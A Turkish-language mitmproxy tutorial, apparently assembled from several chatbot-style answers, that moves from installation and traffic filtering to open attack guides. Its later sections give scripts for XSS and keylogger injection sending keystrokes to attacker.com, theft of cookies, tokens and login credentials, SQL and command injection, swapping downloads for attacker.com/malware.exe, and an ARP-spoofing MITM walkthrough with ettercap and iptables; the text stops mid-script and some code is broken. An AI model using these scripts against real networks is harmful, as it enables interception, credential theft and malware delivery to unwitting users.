mitmproxy Kullanımı (Detaylı Anlatım)
mitmproxy, ağ trafiğini analiz etmek, değiştirmek ve manipüle etmek için kullanılan güçlü bir Man-in-the-Middle (MitM) proxy aracıdır. Web uygulamaları, API'ler ve mobil uygulamalar üzerinde pentest yaparken oldukça faydalıdır.

1️⃣ mitmproxy'nin Kurulumu
Linux / MacOS için Kurulum:
bash
pip install mitmproxy
Alternatif olarak, sistem paket yöneticisiyle de yükleyebilirsin:
bash
sudo apt install mitmproxy # Debian/Ubuntu tabanlı sistemler için
brew install mitmproxy # MacOS için
Windows için Kurulum:
Python yüklü değilse önce yükle.
Sonrasında komut satırında şu komutu çalıştır:
bash
pip install mitmproxy
Kurulum tamamlandıktan sonra aşağıdaki komutlarla mitmproxy'yi başlatabilirsin:
bash
mitmproxy # CLI arayüzü ile çalıştır
mitmweb # Web arayüzü ile çalıştır
mitmdump # Komut satırı üzerinden kayıt/log toplamak için


2️⃣ mitmproxy'yi Başlatma ve Kullanma
🔹 Temel Çalıştırma Komutları:
mitmproxy'yi başlatmak için:
bash
mitmproxy
Bu komut, CLI tabanlı bir proxy arayüzü açacaktır.
Web Arayüzü Kullanmak için:
bash
mitmweb
Arayüze erişmek için:
http://127.0.0.1:8081 adresini tarayıcıda aç.
Komut satırında işlem yapmak için:
bash
mitmdump

Bu modda JSON veya log çıktıları alabilirsin.

3️⃣ Cihazın Trafiğini mitmproxy'ye Yönlendirme
🔹 Tarayıcı Trafiğini Yönlendirme
Proxy Ayarlarını Değiştir:
Chrome / Firefox / Edge gibi tarayıcılarda:
Ayarlar → Ağ Ayarları → Proxy Ayarları kısmına gir.
Manuel proxy yapılandırması seçeneğini aç.
HTTP Proxy: 127.0.0.1
Port: 8080
HTTPS Trafiğini İncelemek için Sertifika Yükle
mitmproxy, HTTPS trafiğini inceleyebilmek için özel bir CA sertifikasına ihtiyaç duyar. Sertifikayı yüklemek için:
arduino
http://mitm.it
adresine git ve uygun sertifikayı yükle.
Windows: .pem dosyasını aç ve "Güvenilen Sertifikalar" kısmına ekle.
Linux/MacOS: Sertifikayı /usr/local/share/ca-certificates/ dizinine koy ve update-ca-certificates çalıştır.

4️⃣ mitmproxy ile HTTP ve HTTPS Trafiğini Yakalama
Sistemin proxy ayarlarını mitmproxy'ye yönlendirdikten sonra, tüm HTTP ve HTTPS isteklerini yakalayabilirsin.
Arayüzde yakalanan istekleri incelemek için:
[Tab] → Bir isteği seçmek için kullanılır.
[Enter] → İsteğin detaylarını görmek için.
[A] → İsteği kabul etmek.
[D] → İsteği silmek.
[E] → İstek üzerinde değişiklik yapmak.

5️⃣ mitmproxy ile Trafiği Manipüle Etme
🔹 mitmproxy üzerinde isteği değiştirme
Bir HTTP isteğini yakaladıktan sonra, gönderilmeden önce veya yanıt alındıktan sonra değiştirebilirsin.
Bir isteği seç
[E] tuşuna basarak düzenleme moduna geç
Parametreleri değiştir ve kaydet
[A] tuşuna basarak devam ettir
Örnek: Kullanıcı-agent değiştirme Bir isteğin User-Agent başlığını şu şekilde değiştirebilirsin:
bash
mitmproxy -s "def response(flow): flow.request.headers['User-Agent'] = 'MyCustomAgent'"


6️⃣ mitmproxy ile Otomatik Saldırı ve Manipülasyon
mitmproxy Python ile script yazma desteği sunar.
Örneğin, tüm yanıtları değiştirmek için şu betiği kullanabilirsin:
python
from mitmproxy import http

def response(flow: http.HTTPFlow):
 if "password" in flow.request.pretty\_url:
 flow.response.text = "Hacked!"
Bunu çalıştırmak için:
bash
mitmproxy -s script.py


7️⃣ mitmproxy ile API Trafiğini İnceleme
API endpoint'lerine giden istekleri inceleyip, JSON veya XML içeriğini değiştirebilirsin.
Örneğin, bir API isteğini manipüle etmek için:
bash
mitmproxy -s "def response(flow): flow.response.text = flow.response.text.replace('success', 'fail')"

Bu kod, tüm 'success' yanıtlarını 'fail' olarak değiştirecektir.

8️⃣ mitmproxy ile Erişim Engeli (Firewall) Koyma
Bazı siteleri veya istekleri engellemek için:
python
from mitmproxy import http

def request(flow: http.HTTPFlow):
 if "facebook.com" in flow.request.pretty\_url:
 flow.response = http.HTTPResponse.make(
 403, # Status Code
 b"Access Forbidden!", # Response Body
 {"Content-Type": "text/html"} # Headers
 )

Bunu çalıştırmak için:
bash
mitmproxy -s block.py
Bu kod, facebook.com trafiğini yasaklayacaktır.

9️⃣ Logları Kayıt Altına Alma
Tüm yakalanan trafiği log olarak kaydetmek için:
bash
mitmdump -w trafik.log
Daha sonra logları analiz etmek için:
bash
mitmproxy -r trafik.log






🔟 Sonuç ve Özet
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
MITMProxy'de Analiz ve Filtreleme Nasıl Yapılır?
MITMProxy, ağ trafiğini analiz etmek ve manipüle etmek için kullanılan güçlü bir Man-in-the-Middle (MITM) aracıdır. Canlı trafik izleme, filtreleme ve düzenleme gibi işlemleri yapmanıza olanak tanır. Aşağıda analiz ve filtreleme işlemlerini nasıl gerçekleştirebileceğinizi anlatıyorum.

1. Trafik Analizi
MITMProxy’de trafiği analiz etmek için iki temel araç kullanabilirsiniz:
mitmproxy (CLI tabanlı arayüz)
mitmweb (Web arayüzü)
Eğer CLI kullanıyorsanız:
bash
mitmproxy
Eğer Web arayüzünü kullanmak istiyorsanız:
bash
mitmweb
Komutunu çalıştırdıktan sonra, http://127.0.0.1:8081 adresinden erişebilirsiniz.
🔍 Trafik İnceleme
MITMProxy, yakalanan trafiği liste halinde gösterir.
Bir istek seçerek detaylarını görebilir, headers, cookies, request ve response body gibi verileri analiz edebilirsiniz.

2. Trafik Filtreleme
MITMProxy’de istekleri filtrelemek için birkaç yöntem kullanabilirsiniz:
📌 a) Komut ile Filtreleme
Aşağıdaki komutları MITMProxy arayüzündeyken kullanabilirsiniz:
Belirli bir domain'e ait istekleri listele
plaintext
~d example.com
(Sadece example.com alan adına ait trafiği gösterir.)
Belirli bir HTTP metoduna göre filtreleme
plaintext
~m GET
(Sadece GET isteklerini gösterir.)
Yanıt koduna göre filtreleme
plaintext
~c 200
(Sadece HTTP 200 yanıtlarını gösterir.)
Belirli bir kelimeyi içeren URL'leri göster
plaintext
~u login
(URL’sinde login geçen istekleri gösterir.)
Belirli bir içeriği içeren response body’leri göster
plaintext
~b password
(Yanıt gövdesinde password geçen istekleri gösterir.)

📌 b) Python Script ile Filtreleme
MITMProxy'nin addon API’si sayesinde özel Python betikleri yazabilirsiniz.
Aşağıdaki örnek, sadece Google’a giden trafiği filtreleyip log’lamaya yarayan bir MITMProxy scriptidir:
python
from mitmproxy import http

def request(flow: http.HTTPFlow):
 if "google.com" in flow.request.pretty\_url:
 print(f"Google isteği yakalandı: {flow.request.pretty\_url}")

Bu script’i filter.py olarak kaydedip şu şekilde çalıştırabilirsiniz:
bash
mitmproxy -s filter.py


3. Filtrelenmiş Trafiği Dışa Aktarma
Eğer filtrelenmiş trafiği bir dosyaya kaydetmek isterseniz:
Sadece belirli bir siteye ait trafiği JSON olarak kaydetmek için:
bash
mitmproxy -w logfile.mitm
Daha sonra, kaydedilen trafiği JSON formatında dışa aktarmak için:
bash
mitmdump -nr logfile.mitm --json > output.json
Sadece belirli bir kelimeyi içeren logları almak için:

mitmdump -nr logfile.mitm | grep "password"

4. HTTP ve HTTPS Trafiğini Filtreleme
MITMProxy, varsayılan olarak HTTP ve HTTPS trafiğini dinleyebilir. Ancak, sadece HTTPS trafiğini görmek istiyorsanız şu komutu kullanabilirsiniz:
bash
mitmproxy --mode transparent --showhost

Eğer sadece belirli bir port üzerinden gelen trafiği analiz etmek istiyorsanız:
bash
mitmproxy --listen-port 8080


Sonuç
MITMProxy ile analiz ve filtreleme işlemleri yapmak oldukça kolaydır. Özet olarak:
Komutlarla trafik filtreleme (~d, ~m, ~c, ~b kullanarak)
Python betikleri ile özel filtreleme
Belirli URL, HTTP metodu veya içeriklere göre trafiği listeleme
Dışa aktarma ve kayıt işlemleri
ITMProxy’de Trafiği Durdurma Yöntemleri
MITMProxy ile belirli istekleri durdurabilir, engelleyebilir veya geciktirebilirsiniz. Bunu yapmak için CLI komutlarını, Python betiklerini veya mitmproxy arayüzünü kullanabilirsiniz.

1. Canlı Trafiği Durdurmak (Intercept Modu)
MITMProxy’de belirli istekleri durdurup incelemek için Intercept Modu kullanılabilir.
📌 a) Tüm Trafiği Durdurma
Komut satırında şu komutu girerek tüm trafiği durdurabilirsiniz:
plaintext
:i ~q

Bu komut, yakalanan tüm istekleri durdurur ve sizin müdahalenizi bekler.
📌 b) Belirli URL’leri Durdurma
Eğer sadece belirli bir alan adına ait istekleri durdurmak istiyorsanız:
plaintext
:i ~u example.com
Bu komut, URL’sinde example.com geçen tüm istekleri duraklatır.

2. Python ile Belirli Trafiği Durdurma
MITMProxy'nin Python betiklerini kullanarak belirli istekleri durdurabilirsiniz.
🔹 Örnek 1: Belirli Bir Siteye Giden Trafiği Durdurmak
Aşağıdaki betik, Google’a giden tüm istekleri durdurur ve kullanıcı onay vermeden ilerlemesine izin vermez:
python
from mitmproxy import ctx, http

def request(flow: http.HTTPFlow):
 if "google.com" in flow.request.pretty\_url:
 ctx.log.info(f"Google isteği durduruldu: {flow.request.pretty\_url}")
 flow.intercept()

Kaydettikten sonra şu komutla çalıştırabilirsiniz:
bash
mitmproxy -s script.py
🔹 Örnek 2: Belirli Bir İçeriğe Sahip İstekleri Durdurmak
Eğer POST istekleri içinde "password" kelimesi geçenleri durdurmak isterseniz:
python
from mitmproxy import http

def request(flow: http.HTTPFlow):
 if flow.request.method == "POST" and b"password" in flow.request.content:
 flow.intercept()


3. Trafiği Geciktirme veya Engelleme
Eğer belirli istekleri geciktirmek veya tamamen engellemek istiyorsanız, şu yöntemleri kullanabilirsiniz:
🔹 Trafiği Geciktirme (Delay)
Aşağıdaki betik, belirli bir URL’ye giden istekleri 5 saniye geciktirir:
python
import time
from mitmproxy import http

def request(flow: http.HTTPFlow):
 if "example.com" in flow.request.pretty\_url:
 time.sleep(5) # 5 saniye beklet
🔹 Trafiği Tamamen Engelleme
Eğer belirli bir siteye erişimi tamamen engellemek isterseniz:
python
from mitmproxy import http

def request(flow: http.HTTPFlow):
 if "facebook.com" in flow.request.pretty\_url:
 flow.response = http.Response.make(403, b"Erişim Engellendi")

Bu script, Facebook’a erişmek isteyen tüm istemcilere 403 Forbidden yanıtını döndürür.

4. Mitmproxy Web Arayüzü ile Trafiği Durdurma
Eğer mitmweb kullanıyorsanız:
Mitmweb’i başlatın:
bash
mitmweb

http://127.0.0.1:8081 adresine gidin.
İlgili isteği seçip "Intercept" butonuna tıklayın.
İsteği düzenleyip devam ettirebilir veya silebilirsiniz.

Sonuç
MITMProxy ile trafiği durdurmanın ve müdahale etmenin birkaç yolu var:
CLI komutları ile (~i, ~u, ~m kullanarak)
Python betikleri ile belirli istekleri durdurma veya engelleme
Gecikme (delay) veya tamamen engelleme
Mitmweb kullanarak manuel olarak durdurma
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
MITMProxy ile Trafik Akışını Modifiye Etme (Manipülasyon)
MITMProxy kullanarak ağ trafiğini istek (request) ve yanıt (response) seviyesinde değiştirebilir, ekleme yapabilir veya belirli kurallar uygulayarak manipüle edebilirsiniz. Bunu yapmanın en yaygın yolu Python betikleri yazmaktır.

1. İstek (Request) Manipülasyonu
Bir HTTP isteğini değiştirmek, yönlendirmek veya manipüle etmek için request(flow) fonksiyonunu kullanabilirsiniz.
🔹 Örnek 1: HTTP Başlıklarını (Headers) Değiştirme
Aşağıdaki betik, tüm isteklerin User-Agent başlığını değiştirmektedir:
python
from mitmproxy import http

def request(flow: http.HTTPFlow):
 flow.request.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86\_64)"


🔹 Çalıştırmak için:
bash
mitmproxy -s modify\_request.py

🔹 Örnek 2: Gönderilen POST Verisini Değiştirme
Eğer bir POST isteğinin gönderilen form verisini değiştirmek istiyorsanız:
python
from mitmproxy import http

def request(flow: http.HTTPFlow):
 if flow.request.method == "POST" and "password" in flow.request.text:
 flow.request.text = flow.request.text.replace("password=12345", "password=hacked")
📌 Bu betik, kullanıcı şifresini değiştirmektedir.

🔹 Örnek 3: Bir URL'yi Yönlendirme (Redirect)
Eğer belirli bir siteye yapılan istekleri başka bir siteye yönlendirmek istiyorsanız:
python
from mitmproxy import http

def request(flow: http.HTTPFlow):
 if "victim.com" in flow.request.pretty\_url:
 flow.request.url = flow.request.url.replace("victim.com", "evil.com")
📌 Bu betik, "victim.com" adresine giden istekleri "evil.com" adresine yönlendirir.

2. Yanıt (Response) Manipülasyonu
Bir HTTP yanıtını değiştirmek için response(flow) fonksiyonunu kullanabilirsiniz.
🔹 Örnek 4: Yanıt İçeriğini Manipüle Etme
Aşağıdaki betik, belirli bir sitenin yanıtlarını değiştirir:
python
from mitmproxy import http

def response(flow: http.HTTPFlow):
 if "example.com" in flow.request.pretty\_url:
 flow.response.text = "# Hacked by MITMProxy

"
📌 Bu betik, example.com sayfasını ziyaret eden kullanıcılara "Hacked by MITMProxy" mesajını gösterecektir.

🔹 Örnek 5: JSON API Yanıtını Değiştirme
Eğer bir JSON API yanıtını değiştirmek istiyorsanız:
python
import json
from mitmproxy import http

def response(flow: http.HTTPFlow):
 if "api.example.com/data" in flow.request.pretty\_url:
 data = json.loads(flow.response.text)
 data["balance"] = 999999 # Kullanıcının bakiyesini 999999 olarak değiştir
 flow.response.text = json.dumps(data)
📌 Bu betik, bir API çağrısında dönen JSON verisindeki "balance" değerini değiştirir.

3. Belirli Bir Trafiği Geciktirme
Eğer bir yanıtı geciktirmek istiyorsanız:
python
import time
from mitmproxy import http

def response(flow: http.HTTPFlow):
 if "slow-website.com" in flow.request.pretty\_url:
 time.sleep(5) # 5 saniye geciktirme
📌 Bu betik, "slow-website.com" adresine gelen yanıtları 5 saniye geciktirir.

4. HTTPS Trafiğini Manipüle Etme (SSL Passthrough Kapatma)
MITMProxy, HTTPS trafiğini analiz edebilmek için sertifika yüklenmesini gerektirir. Eğer HTTPS trafiğini manipüle etmek istiyorsanız:
bash
mitmproxy --set block\_global=false
MITMProxy sertifikasını yükleyin:
Tarayıcıya veya cihaza sertifikayı yükleyin (http://mitm.it adresinden indirebilirsiniz).
Yukarıdaki betikleri HTTPS sitelerine uygulayabilirsiniz.

5. Mitmweb ile Manuel Değişiklik Yapma
Eğer grafik arayüz kullanarak istekleri ve yanıtları düzenlemek istiyorsanız:

mitmweb
Mitmweb'i başlatın:
http://127.0.0.1:8081 adresine gidin.
Bir isteği veya yanıtı seçin, sağ üstte Edit butonuna tıklayın.
Değişiklik yaptıktan sonra "Save" butonuna basarak akışı manipüle edin.

Sonuç
MITMProxy ile trafik manipülasyonu yapmanın birçok yolu var:
İstek manipülasyonu (User-Agent değiştirme, yönlendirme, form verisi değiştirme)
Yanıt manipülasyonu (HTML içeriğini değiştirme, JSON API manipülasyonu)
Trafik geciktirme ve yönlendirme
Mitmweb arayüzü ile manuel düzenleme



MITMProxy ile Otomatik Akış Değiştirme
MITMProxy'yi kullanarak trafik akışını otomatik olarak değiştirmek, yani istek (request) ve yanıt (response) manipülasyonlarını otomatikleştirmek mümkündür. Bunu yapmak için Python scriptleri (addon) kullanabiliriz.

1. MITMProxy Addon ile Otomatik Akış Değiştirme
MITMProxy, "addons" mantığını kullanarak akışı otomatik olarak değiştiren Python scriptleri çalıştırabilir. Bu scriptleri yazıp mitmproxy veya mitmweb ile entegre edebiliriz.
Aşağıda bazı otomatik manipülasyon senaryolarını paylaşacağım.

2. Otomatik İstek (Request) Manipülasyonu
İstekleri otomatik olarak değiştirmek için request(flow) fonksiyonu kullanılır.
🔹 Örnek 1: User-Agent Değiştirme
İsteklere otomatik olarak farklı bir User-Agent eklemek:
python
from mitmproxy import http

def request(flow: http.HTTPFlow):
 flow.request.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
📌 Bu script, tüm isteklerin User-Agent'ını değiştirir.

🔹 Örnek 2: Otomatik GET → POST Dönüştürme
Eğer tüm GET isteklerini otomatik olarak POST isteğine dönüştürmek isterseniz:
python
from mitmproxy import http

def request(flow: http.HTTPFlow):
 if flow.request.method == "GET":
 flow.request.method = "POST"
 flow.request.content = b"modified\_data=1" # Gönderilen veri

📌 Bu betik, tüm GET isteklerini POST olarak değiştirir.

🔹 Örnek 3: Otomatik Yönlendirme (Redirect)
Tüm example.com isteklerini attacker.com adresine yönlendirmek için:
python
from mitmproxy import http

def request(flow: http.HTTPFlow):
 if "example.com" in flow.request.pretty\_url:
 flow.request.url = flow.request.url.replace("example.com", "attacker.com")
📌 Bu betik, tüm example.com isteklerini attacker.com adresine yönlendirir.

🔹 Örnek 4: Otomatik Header Ekleme
Bazı API'ler veya uygulamalar, kimlik doğrulama için belirli başlıkları gerektirebilir. Aşağıdaki script, tüm isteklere özel bir API anahtarı ekler:
python
from mitmproxy import http

def request(flow: http.HTTPFlow):
 flow.request.headers["Authorization"] = "Bearer hacked-token"
📌 Bu betik, tüm isteklerin başlığına Authorization: Bearer hacked-token ekler.

3. Otomatik Yanıt (Response) Manipülasyonu
Yanıtları otomatik olarak değiştirmek için response(flow) fonksiyonu kullanılır.
🔹 Örnek 5: Web Sayfası İçeriğini Değiştirme
python
from mitmproxy import http

def response(flow: http.HTTPFlow):
 if "example.com" in flow.request.pretty\_url:
 flow.response.text = "# Hacked by MITMProxy

"

📌 Bu betik, example.com yanıtlarını değiştirerek "Hacked by MITMProxy" mesajını gösterir.

🔹 Örnek 6: JSON API Manipülasyonu
Bir JSON API'den dönen veriyi değiştirmek için:
python
import json
from mitmproxy import http

def response(flow: http.HTTPFlow):
 if "api.example.com/data" in flow.request.pretty\_url:
 data = json.loads(flow.response.text)
 data["balance"] = 999999 # Bakiye değiştirildi
 flow.response.text = json.dumps(data)
📌 Bu betik, bir API çağrısındaki balance değerini 999999 olarak değiştirir.

🔹 Örnek 7: Yanıt İçeriğini Otomatik Olarak Sansürleme
Web sitelerinde görünen belirli kelimeleri otomatik olarak değiştirmek isterseniz:
python
from mitmproxy import http

def response(flow: http.HTTPFlow):
 if "example.com" in flow.request.pretty\_url:
 flow.response.text = flow.response.text.replace("yasaklı kelime", "****")
📌 Bu betik, yanıt içindeki yasaklı kelimeleri sansürler.

4. HTTPS Trafiğini Manipüle Etmek
MITMProxy, HTTPS trafiğini manipüle edebilmek için sertifika yüklenmesini gerektirir.
HTTPS trafiğini değiştirmek için:
bash
mitmproxy --set block\_global=false
MITMProxy sertifikasını yükleyin:
Tarayıcıya veya cihaza sertifikayı yükleyin (http://mitm.it adresinden indirilebilir).
Yukarıdaki betikleri HTTPS sitelerine uygulayabilirsiniz.

5. MITMProxy Addon Scriptini Çalıştırmak
Otomatik trafik manipülasyonu yapmak için Python scriptini şu şekilde çalıştırabilirsiniz:
bash
mitmproxy -s modify\_traffic.py
veya
bash
mitmweb -s modify\_traffic.py
Eğer CLI arayüz yerine grafik arayüz (mitmweb) kullanmak istiyorsanız, http://127.0.0.1:8081 adresinden manuel düzenlemeler de yapabilirsiniz.

Sonuç
MITMProxy ile otomatik akış değiştirme işlemleri şunları kapsar: ✅ İstekleri manipüle etme (User-Agent, yönlendirme, veri değiştirme)
✅ Yanıtları manipüle etme (JSON API değiştirme, içerik değiştirme)
✅ HTTPS trafiğini manipüle etme (SSL sertifikası gereklidir)
✅ Otomatik sansürleme veya içerik ekleme


MITMProxy ile Saldırı ve Enjeksiyon Teknikleri
MITMProxy kullanarak trafik manipülasyonu yapabilir, saldırı senaryolarını test edebilir ve enjeksiyonlar gerçekleştirebilirsiniz. Bu, özellikle güvenlik testleri, pentest ve Red Team operasyonlarında kullanılır.
📌 Dikkat: Bu teknikler sadece etik hackerlık ve güvenlik testleri için kullanılmalıdır. Yetkisiz bir şekilde uygulamak yasadışıdır.

1. HTTP/HTTPS İsteklerine Enjeksiyon
MITMProxy ile hedef sistemlere zararlı yükler (payload), JavaScript kodları veya kimlik doğrulama token'ları ekleyebilirsiniz.
🔹 Örnek 1: Web Sayfasına Otomatik XSS Enjeksiyonu
Bir web sitesinin HTML yanıtına otomatik olarak zararlı bir XSS payload'u enjekte etmek:
python
from mitmproxy import http

def response(flow: http.HTTPFlow):
 if "target.com" in flow.request.pretty\_url:
 flow.response.text = flow.response.text.replace("", "alert('XSS')")

📌 Bu betik, "target.com" yanıtına bir XSS saldırısı ekler.

🔹 Örnek 2: API Yanıtına Arka Kapı (Backdoor) Ekleme
Bir REST API yanıtına sahte kullanıcı eklemek için:
python
import json
from mitmproxy import http

def response(flow: http.HTTPFlow):
 if "api.target.com/users" in flow.request.pretty\_url:
 data = json.loads(flow.response.text)
 data["users"].append({"id": 9999, "username": "hacker", "role": "admin"})
 flow.response.text = json.dumps(data)

📌 Bu betik, API yanıtına sahte bir yönetici hesabı ekler.

2. Kimlik Doğrulama ve Çerez (Cookie) Hırsızlığı
MITMProxy ile kimlik doğrulama başlıklarını (Authorization), oturum çerezlerini (Cookies) ve API anahtarlarını (API Keys) çalabilirsiniz.
🔹 Örnek 3: Çerezleri (Cookies) Loglama
python
from mitmproxy import ctx

def request(flow):
 cookies = flow.request.headers.get("Cookie", "")
 if cookies:
 ctx.log.info(f"Çerezler: {cookies}")

📌 Bu betik, tüm çerezleri MITMProxy loglarında gösterir.

🔹 Örnek 4: Bearer Token Çalmak
python
from mitmproxy import ctx

def request(flow):
 auth\_header = flow.request.headers.get("Authorization", "")
 if "Bearer" in auth\_header:
 ctx.log.info(f"Bearer Token: {auth\_header}")

📌 Bu betik, JWT veya OAuth token'larını çalar.

3. Trafik Manipülasyonu ile Enjeksiyon
MITMProxy, HTTP isteği ve yanıtlarını değiştirerek bir saldırı yüzeyi oluşturabilir.
🔹 Örnek 5: SQL Injection Payload Enjeksiyonu
Bir giriş formuna otomatik olarak SQL Injection kodu enjekte etmek:
python
from mitmproxy import http

def request(flow: http.HTTPFlow):
 if flow.request.method == "POST" and "login" in flow.request.pretty\_url:
 flow.request.text = flow.request.text.replace("username=", "username=' OR '1'='1' -- ")

📌 Bu betik, kullanıcı giriş isteklerine otomatik SQL Injection payload'ı ekler.

🔹 Örnek 6: Komut Enjeksiyonu
Eğer sistemde bir komut enjeksiyonu açığı varsa, aşağıdaki betik çalıştırılabilir:
python
from mitmproxy import http

def request(flow: http.HTTPFlow):
 if flow.request.method == "POST" and "execute" in flow.request.pretty\_url:
 flow.request.text = flow.request.text.replace("cmd=", "cmd=whoami; id; uname -a")

📌 Bu betik, hedef sisteme komut çalıştırma saldırısı yapar.

4. HTTPS Trafiğini Manipüle Etme
MITMProxy ile HTTPS trafiğini analiz edip saldırılar düzenlemek için sertifika yüklemek gerekir.
MITMProxy sertifikasını yükleyin:
bash
mitmproxy --set block\_global=false

Tarayıcıya veya cihaza sertifikayı yükleyin (http://mitm.it adresinden).
Yukarıdaki saldırı betiklerini HTTPS sitelerine uygulayın.

5. MITMProxy ile Keylogger Enjeksiyonu
MITMProxy kullanarak kurbanın girdiği her şeyi kaydetmek için bir keylogger ekleyebilirsiniz.
🔹 Örnek 7: Web Sayfasına Keylogger Enjekte Etme
python
from mitmproxy import http

def response(flow: http.HTTPFlow):
 if "target.com" in flow.request.pretty\_url:
 flow.response.text = flow.response.text.replace("", """
 
 document.addEventListener('keypress', function(event) {
 fetch('http://attacker.com/log', { method: 'POST', body: event.key });
 });
 
 """)

📌 Bu betik, hedef web sitesine keylogger enjekte eder ve saldırganın sunucusuna gönderir.

6. Hedef Trafiğini Manipüle Etme (Exploit Sunma)
MITMProxy ile bir kullanıcının belirli bir siteyi ziyaret ettiğinde ona zararlı bir dosya sunabilirsiniz.
🔹 Örnek 8: Kullanıcıya Zararlı EXE Dosyası Sunma
python
from mitmproxy import http

def request(flow: http.HTTPFlow):
 if "example.com/software.exe" in flow.request.pretty\_url:
 flow.request.url = "http://attacker.com/malware.exe"

📌 Bu betik, hedef kullanıcının indirdiği yazılımı saldırganın zararlı dosyasıyla değiştirir.

7. MITMProxy Script'lerini Çalıştırma
Bu saldırı betiklerini çalıştırmak için şu komutu kullanabilirsiniz:
bash
mitmproxy -s attack\_script.py
veya
bash
mitmweb -s attack\_script.py

Mitmweb kullanıyorsanız, http://127.0.0.1:8081 adresinden manuel müdahale edebilirsiniz.

Sonuç
✅ MITMProxy ile Enjeksiyon Teknikleri:
XSS saldırısı enjekte etme
Kimlik doğrulama çerezlerini çalma
SQL Injection payload ekleme
Komut enjeksiyonu
Keylogger ekleyerek kurbanın klavye girdilerini kaydetme
Zararlı yazılım yükleme (drive-by-download saldırıları)
MITMProxy ile Man-in-the-Middle (MITM) Saldırısı Nasıl Yapılır?
MITMProxy, HTTP ve HTTPS trafiğini dinleyerek, değiştirilmiş veya zararlı veriler enjekte ederek Man-in-the-Middle (MITM) saldırıları yapmak için kullanılabilir. Bu kılavuz, MITM saldırısının nasıl gerçekleştirileceğini adım adım anlatmaktadır.
📌 UYARI: Bu teknikler yalnızca etik hackerlık, güvenlik testleri ve eğitim amaçlıdır. Yetkisiz saldırılar yasa dışıdır.

1. MITM Saldırısı Nedir?
Man-in-the-Middle (MITM) saldırısı, saldırganın kurban ile hedef sunucu arasındaki trafiği gizlice dinlediği, değiştirdiği ve yönlendirdiği bir saldırıdır. MITMProxy, bu saldırıyı gerçekleştirmek için güçlü bir araçtır.
✔ HTTPS ve HTTP trafiğini analiz edebilir
✔ Veri paketlerini değiştirebilir veya yönlendirebilir
✔ Oturum çerezlerini (session cookies) çalabilir
✔ Formlara veya yanıt içeriklerine zararlı kod enjekte edebilir

2. MITMProxy Kullanarak MITM Saldırısı Nasıl Yapılır?
MITM saldırısı yapmak için aşağıdaki adımları uygulayacağız:
🔹 Adım 1: MITMProxy’yi Kurma
MITMProxy’yi kurmak için şu komutları kullanabilirsiniz:
bash
sudo apt update
sudo apt install mitmproxy -y
📌 Windows kullanıyorsanız: MITMProxy’yi indirip yükleyebilirsiniz.

🔹 Adım 2: MITMProxy’yi Trafiği Dinlemeye Başlatma
MITM saldırısını gerçekleştirmek için MITMProxy’yi şu şekilde başlatabilirsiniz:
bash
sudo mitmproxy -p 8080 --mode transparent
📌 Bu komut MITMProxy’yi 8080 portunda başlatır ve transparan modda çalıştırır.

🔹 Adım 3: Ağ Trafiğini Yönlendirme (ARP Spoofing)
MITM saldırısı için kurbanın ağ trafiğini kendi cihazımıza yönlendirmemiz gerekir. Bunu ARP Spoofing ile yapabiliriz.
1️⃣ Ettercap Kullanarak ARP Spoofing Yapma
Eğer ağdaki kurbanın trafiğini MITMProxy’ye yönlendirmek istiyorsanız:
bash
sudo ettercap -T -i eth0 -M arp:remote /KURBAN\_IP/ /AĞ\_GEÇİDİ\_IP/
📌 Bu komut, kurbanın (KURBAN\_IP) tüm ağ trafiğini sizin bilgisayarınıza yönlendirir.
2️⃣ iptables Kullanarak Trafiği Yönlendirme
MITMProxy ile kurbanın trafiğini yakalamak için aşağıdaki iptables kurallarını uygulayın:
bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
📌 Bu kurallar, tüm HTTP ve HTTPS trafiğini MITMProxy’ye yönlendirir.

🔹 Adım 4: MITMProxy Sertifikasını Yükleme (HTTPS Trafiğini Okumak İçin)
HTTPS trafiğini analiz edebilmek için, MITMProxy’nin sahte sertifikasını kurbanın cihazına yüklememiz gerekir.
Kurbanın tarayıcısında adresine gidin.
Görünümüne göre uygun sertifikayı indirin ve yükleyin.
"Güvenilir Sertifika" olarak ekleyin.
📌 Böylece HTTPS trafiğini analiz edebilirsiniz!

3. MITMProxy ile Gerçekleştirilebilecek Saldırılar
MITM saldırısı yapıldıktan sonra, trafiği değiştirebilir, veri çalabilir ve zararlı içerik enjekte edebilirsiniz.

📌 Saldırı 1: Kullanıcı Giriş Bilgilerini Çalma
Eğer bir kurban bir web sitesine giriş yapıyorsa, MITMProxy ile giriş bilgilerini çalabilirsiniz:
python
from mitmproxy import http

def request(flow: http.HTTPFlow):
 if "login" in flow.request.pretty\_url:
 username = flow.request.urlencoded\_form.get("username")
 password = flow.request.urlencoded\_form.get("password")
 print(f"Kullanıcı Adı: {username}, Şifre: {password}")

📌 Bu betik, tüm giriş bilgilerini MITMProxy loglarına yazdırır.

📌 Saldırı 2: Kullanıcının Çerezlerini (Cookies) Çalma
Eğer bir kullanıcının oturum çerezlerini çalmak isterseniz:
python
from mitmproxy import ctx

def request(flow):
